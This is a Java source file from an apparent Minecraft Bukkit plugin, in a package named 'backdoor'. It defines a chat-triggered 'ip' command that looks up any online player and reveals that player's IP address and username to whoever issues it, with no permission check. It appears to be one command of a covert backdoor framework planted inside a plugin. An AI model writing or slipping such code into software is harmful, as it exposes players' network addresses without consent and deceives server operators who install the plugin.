package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(
        displayName = "ip",
        usage = {"<prefix> <command> <player>"},
        description = "Tells you the ip of a player",
        aliases = {"ip", "getIp"})
public class IpCommand extends Command {

    public IpCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 1) {
            Player target = Bukkit.getServer().getPlayer(args.get(0));
            Player p = event.getPlayer();

            p.sendMessage("ip: " + target.getAddress() + "\nuserName: " + target.getName());

        } else event.getPlayer().sendMessage(NOT_ENOUGH_ARGS);
    }
}
